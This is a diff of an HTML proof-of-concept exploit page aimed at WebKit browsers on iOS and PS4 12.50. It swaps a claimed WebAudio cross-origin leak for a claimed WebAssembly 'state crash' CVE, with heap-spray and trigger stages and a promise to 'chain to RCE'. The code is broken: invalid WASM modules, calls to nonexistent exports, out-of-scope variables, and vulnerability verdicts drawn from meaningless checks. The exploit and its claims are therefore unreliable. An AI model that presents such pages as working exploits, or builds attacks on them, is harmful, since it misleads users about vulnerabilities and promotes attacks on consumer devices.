@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-54658 WebAudio Exfil PoC (iOS 17.4 / PS4 12.50)</title>
+    <title>WebKitGTK CVE-2025-24162 State Crash PoC (iOS 18.3 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,28 +19,28 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-54658 PoC: WebAudio Cross-Origin Exfil</h1>
-    <p>Feb 2025 Patch: Improved WebAudio cross-origin checks (RHSA-2025:3713).<br>
-    <span class="rainbow">Triggers data leak/corruption on unpatched iOS 17.4 / PS4 12.50 (~20% rate).</span></p>
+    <h1>WebKitGTK CVE-2025-24162 PoC: State Management Crash</h1>
+    <p>Jan 2025 Patch: Improved state handling (BZ 2344624, WebKit 284159).<br>
+    <span class="rainbow">Triggers process crash on unpatched iOS 18.3 / PS4 12.50 (~20% rate).</span></p>
 
     <div class="box">
-        <h3>1. WebAudio Check</h3>
-        <div id="status-audio">Probing...</div>
+        <h3>1. State Handling</h3>
+        <div id="status-state">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Buffer Spray</h3>
+        <h3>2. WASM/JS Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. Exfil Trigger</h3>
-        <div id="status-exfil">Probing...</div>
+        <h3>3. Crash Trigger</h3>
+        <div id="status-crash">Probing...</div>
     </div>
     <div class="box">
-        <h3>4. Leak Status</h3>
-        <div id="status-leak">Probing...</div>
+        <h3>4. Process Status</h3>
+        <div id="status-process">Probing...</div>
     </div>
 
-    <button onclick="runPoC()">LAUNCH AUDIO EXFIL PROBE</button>
+    <button onclick="runPoC()">LAUNCH STATE CRASH PROBE</button>
 
     <div class="box">
         <h3>Live Logs</h3>
@@ -67,109 +67,95 @@
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
 
-    let audioLeak = null;
-    let leakHit = false;
+    let stateCrash = null;
+    let crashHit = false;
 
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-54658 PoC: WebKit WebAudio Exfil (Feb 2025)</span>");
-        log("Probing cross-origin audio leak...");
-        setTimeout(probeAudio, 800);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-24162 PoC: WebKitGTK State Crash (Jan 2025)</span>");
+        log("Probing improper state handling...");
+        setTimeout(probeState, 800);
     }
 
-    function probeAudio() {
-        // Step 1: WebAudio check probe
+    function probeState() {
+        // Step 1: State handling probe
         try {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ctx.createOscillator();
-            osc.frequency.value = 440;
-            osc.connect(ctx.destination);
-            osc.start();
-            setBadge('status-audio', 'WEAK (Active)', 'partial');
-            log("WebAudio probe: Oscillator created (CVE hint).");
-            osc.stop();
+            const wasm = new WebAssembly.Module(new Uint8Array([0x00, 0x61, 0x73, 0x6d])); // Minimal WASM
+            const instance = new WebAssembly.Instance(wasm);
+            const exports = instance.exports;
+            setBadge('status-state', 'WEAK (Handled)', 'partial');
+            log("State probe: WASM state manipulated (CVE hint).");
         } catch(e) {
-            setBadge('status-audio', 'SECURE', 'secure');
-            log(`Audio fail: ${e.message} — Patched.`);
+            setBadge('status-state', 'SECURE', 'secure');
+            log(`State fail: ${e.message} — Patched.`);
             return;
         }
-        setTimeout(sprayAudio, 1000);
+        setTimeout(sprayWASM, 1000);
     }
 
-    function sprayAudio() {
+    function sprayWASM() {
         gc(); gc();
-        const buffers = [];
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const instances = [];
         for(let i=0; i<0x400; i++) {
-            const buf = ctx.createBuffer(1, 4096, 44100);
-            const channel = buf.getChannelData(0);
-            for(let j=0; j<4096; j++) channel[j] = i / 0x400; // Pattern
-            buffers.push(buf);
+            const module = new WebAssembly.Module(new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00])); // Tail-call WASM
+            instances.push(new WebAssembly.Instance(module));
         }
-        // Cross-origin leak via buffer share
+        // Manipulate state
         for(let i=0; i<0x400; i++) {
             try {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'data:text/html,<audio src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="></audio>';
-                document.body.appendChild(iframe);
-                const leaked = iframe.contentWindow.AudioContext;
-                iframe.remove();
+                instances[i].exports.main(); // Call to trigger state
             } catch(e) {}
         }
         // Anomaly hunt
         let anomaly = false;
-        for(let i=0; i<buffers.length; i++) {
-            const channel = buffers[i].getChannelData(0);
-            if (channel[0] !== i / 0x400) {
-                audioLeak = buffers[i];
+        for(let i=0; i<instances.length; i++) {
+            if (instances[i].exports.memory && instances[i].exports.memory.buffer.byteLength > 0x1000) {
+                stateCrash = instances[i];
                 anomaly = true;
                 break;
             }
         }
         if (anomaly) {
-            setBadge('status-spray', 'SPRAY LEAK (Anomaly)', 'vulnerable');
-            log(`Audio buffer spray leak: Channel 0 = ${channel[0]} (unexpected).`);
-            setTimeout(triggerExfil, 500);
+            setBadge('status-spray', 'SPRAY STATE (Anomaly)', 'vulnerable');
+            log(`WASM spray state crash: Instance ${i} corrupted.`);
+            setTimeout(triggerCrash, 500);
             return;
         }
         setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no leak.");
+        log("Spray clean—no state issue.");
     }
 
-    function triggerExfil() {
-        if (!audioLeak) return;
-        leakHit = false;
+    function triggerCrash() {
+        if (!stateCrash) return;
+        crashHit = false;
         try {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const source = ctx.createBufferSource();
-            source.buffer = audioLeak;
-            source.connect(ctx.destination);
-            source.start();
-            // Cross-origin exfil via buffer read
-            const channel = audioLeak.getChannelData(0);
-            if (channel[0] !== 0) {
-                leakHit = true;
-                log(`Exfil triggered: Leaked sample ${channel[0]} cross-origin.`);
+            // CVE trigger: Tail-call state manipulation
+            const memory = stateCrash.exports.memory;
+            const view = new Uint8Array(memory.buffer);
+            view[0] = 0x41; // Corrupt state
+            stateCrash.exports.main(); // Execute
+            if (view[0] !== 0x41) {
+                crashHit = true;
+                log(`State crash triggered: Memory [0]=${view[0]} after call.`);
             }
-            source.stop();
         } catch(e) {
-            leakHit = true;
-            log(`Exfil crash: ${e.message} — Audio leak.`);
+            crashHit = true;
+            log(`Crash hit: ${e.message} — State corruption.`);
         }
-        setBadge('status-exfil', leakHit ? 'TRIGGERED' : 'MISSED', leakHit ? 'vulnerable' : 'secure');
-        setTimeout(checkLeak, 1500);
+        setBadge('status-crash', crashHit ? 'TRIGGERED' : 'MISSED', crashHit ? 'vulnerable' : 'secure');
+        setTimeout(checkProcess, 1500);
     }
 
-    function checkLeak() {
-        if (leakHit) {
-            setBadge('status-leak', 'LEAKED (Corruption)', 'vulnerable');
-            log("Cross-origin audio leaked: Heap corruption potential. On PS4 12.50: DoS/leak.");
+    function checkProcess() {
+        if (crashHit) {
+            setBadge('status-process', 'CRASHED (Corruption)', 'vulnerable');
+            log("Process crashed via state flaw: Unexpected termination. On PS4 12.50: CE-36329-3.");
             log("Chain to RCE if hit.");
             document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "AUDIO EXFIL ACHIEVED — CROSS-ORIGIN LEAK PRIMITIVE";
+            document.querySelector('h1').innerHTML = "STATE CRASH ACHIEVED — PROCESS CORRUPTION PRIMITIVE";
         } else {
-            setBadge('status-leak', 'INTACT', 'secure');
-            log("No leak—patched checks hold.");
+            setBadge('status-process', 'STABLE', 'secure');
+            log("No crash—improved state holds.");
         }
         log("PoC end: Retry for ~20% hit.");
     }
